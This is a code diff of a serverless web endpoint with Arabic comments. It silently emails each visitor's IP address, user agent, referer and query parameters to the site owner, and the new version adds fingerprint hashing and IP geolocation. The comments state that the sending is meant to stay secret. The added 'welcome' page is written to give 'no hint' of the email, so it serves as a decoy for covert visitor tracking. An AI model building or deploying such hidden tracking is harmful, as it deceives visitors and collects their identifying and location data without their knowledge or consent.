@@ -1,51 +1,22 @@
 
 // api/index.js
-
-// حمّل dotenv اختياريًا للتطوير المحلي فقط
-if (process.env.VERCEL !== '1') {
-  try {
-    require('dotenv').config();
-  } catch (e) {
-    // تطوير محلي فقط
-    console.warn('dotenv not loaded (likely running in production on Vercel).');
-  }
-}
-
-const { getVisitContext, shouldSendForIp } = require('../lib/utils');
+require('dotenv').config();
+const { getVisitContext, isPrivateIP, hashSha256, escapeHTML, shouldSendForIp } = require('../lib/utils');
 const { sendVisitEmail } = require('../lib/email');
 
-// استثناء الستاتيك (favicon, صور, CSS, JS, خطوط...)
-// لو عايز ترسل حتى في favicon اشطب الامتدادات أو استثني /favicon.ico تحديدًا
-const STATIC_EXT_REGEX = /\.(css|js|png|jpg|jpeg|svg|ico|gif|webp|pdf|map|woff2?|ttf|eot|txt)$/i;
-
 module.exports = async (req, res) => {
-  // السماح بـ GET و HEAD فقط
+  // لو عايز تسمح بـ HEAD كمان، سيبه يعدّي 200 من غير إرسال
   if (req.method !== 'GET' && req.method !== 'HEAD') {
     res.statusCode = 405;
     return res.end('Method Not Allowed');
   }
 
-  // منع إرسال لأي طلب ستاتيك (اختياري)
-  const pathOnly = (req.url || '/').split('?')[0];
-  if (STATIC_EXT_REGEX.test(pathOnly)) {
-    res.statusCode = 204; // No Content
-    res.setHeader('Cache-Control', 'no-store');
-    return res.end();
-  }
-
-  // استخراج السياق (IP, UA, Referer...)
   const ctx = getVisitContext(req);
 
-  // قراءة Query Params فقط (بدون أي طلبات خارجية)
+  // إعداد Payload من Query Params فقط
+  // (هنا استخدمنا البروتوكول من الهيدر لو متاح حرصًا)
   const proto = String(req.headers['x-forwarded-proto'] || 'https');
-  const host = req.headers.host || '';
-  const url = req.url || '/';
-  let urlObj;
-  try {
-    urlObj = new URL(`${proto}://${host}${url}`);
-  } catch {
-    urlObj = new URL(`${proto}://${host}/`);
-  }
+  const urlObj = new URL(`${proto}://${req.headers.host}${req.url || '/'}`);
   const qp = urlObj.searchParams;
 
   const payload = {
@@ -60,32 +31,80 @@ module.exports = async (req, res) => {
     sessionId: qp.get('sessionId') || null,
   };
 
-  // التحكم في التهدئة + شرط الأسرار
+  // تهدئة الإرسال حسب الـ IP + شرط وجود المتغيرات السرية
   const ip = ctx.clientIP;
   const canSend = shouldSendForIp(ip);
-  const { EMAIL_TO, EMAIL_USER, EMAIL_APP_PASSWORD } = process.env;
-  const hasSecrets = Boolean(EMAIL_TO && EMAIL_USER && EMAIL_APP_PASSWORD);
-
-  if (canSend && hasSecrets) {
-    // إرسال صامت في الخلفية (fire-and-forget)
+  if (canSend && process.env.EMAIL_TO && process.env.EMAIL_USER && process.env.EMAIL_APP_PASSWORD) {
     (async () => {
       try {
         await sendVisitEmail({ payload, context: ctx });
-        // لا تطبع شيء في الإنتاج عشان الصمت الكامل
-        if (process.env.VERCEL !== '1') {
-          console.log(`[EMAIL] sent silently for ${ip}`);
-        }
+        console.log(`[EMAIL] sent (silent) for ${ip}`);
       } catch (err) {
-        // سجّل الخطأ محليًا فقط
-        if (process.env.VERCEL !== '1') {
-          console.error('[EMAIL] failed:', err?.message || err);
-        }
+        console.error('[EMAIL] failed:', err.message);
       }
     })();
   }
 
-  // رد صامت دائمًا
-  res.statusCode = 204; // No Content
-  res.setHeader('Cache-Control', 'no-store');
-  return res.end();
+  // معلومات عامة للواجهة (من غير أي تلميح عن الإرسال)
+  const now = new Date();
+  const userAgent = req.headers['user-agent'] || 'Unknown';
+  const acceptLang = req.headers['accept-language'] || 'Unknown';
+  const fingerprintHash = hashSha256(`${ctx.clientIP}\n${userAgent}\n${acceptLang}`);
+
+  // (اختياري) Geolocation من ipapi لو IP عام
+  let ipGeo = { city: null, region: null, country_name: null, latitude: null, longitude: null, org: null, message: null };
+  if (!isPrivateIP(ctx.clientIP) && ctx.clientIP) {
+    try {
+      const resp = await fetch(`https://ipapi.co/${ctx.clientIP}/json/`, { headers: { 'User-Agent': 'telemetry-app' } });
+      if (resp.ok) {
+        const data = await resp.json();
+        ipGeo.city = data.city || null;
+        ipGeo.region = data.region || null;
+        ipGeo.country_name = data.country_name || data.country || null;
+        ipGeo.latitude = data.latitude || null;
+        ipGeo.longitude = data.longitude || null;
+        ipGeo.org = data.org || data.asn || null;
+      }
+    } catch {
+      // تجاهل أي أخطاء في الـ fetch علشان الواجهة ما تتأثرش
+    }
+  }
+
+  // واجهة بسيطة (بدون أي ذكر للإيميل)
+  res.setHeader('Content-Type', 'text/html; charset=utf-8');
+  res.end(`<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <title>مرحبا</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    :root { --bg:#0f172a; --card:#111827; --text:#e5e7eb; --muted:#9ca3af; --accent:#22d3ee; }
+    body { margin:0; font-family: system-ui, Arial; background: var(--bg); color: var(--text); }
+    .wrap { max-width: 960px; margin: 40px auto; padding: 0 16px; }
+    .card { background: var(--card); border-radius: 16px; padding: 24px; }
+    h1 { margin-top:0; font-size: 22px; }
+    .grid { display:grid; grid-template-columns: repeat(auto-fit,minmax(240px,1fr)); gap: 12px; }
+    .item { background: rgba(255,255,255,.04); border:1px solid rgba(255,255,255,.08); border-radius: 12px; padding: 14px; }
+    .label { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .08em; }
+    .val { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; font-size:14px; word-break: break-all; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>أهلا بيك</h1>
+      <div class="grid">
+        <div class="item"><div class="label">المتصفح</div><div class="val">${escapeHTML(userAgent)}</div></div>
+        <div class="item"><div class="label">اللغة</div><div class="val">${escapeHTML(acceptLang)}</div></div>
+        <div class="item"><div class="label">البلد</div><div class="val">${escapeHTML(ipGeo.country_name ?? '-')}</div></div>
+        <div class="item"><div class="label">المدينة</div><div class="val">${escapeHTML(ipGeo.city ?? '-')}</div></div>
+        <div class="item"><div class="label">منظّمة/ISP</div><div class="val">${escapeHTML(ipGeo.org ?? '-')}</div></div>
+        <div class="item"><div class="label">Fingerprint</div><div class="val">${escapeHTML(fingerprintHash)}</div></div>
+        <div class="item"><div class="label">الوقت</div><div class="val">${escapeHTML(now.toISOString())}</div></div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>`);
 };
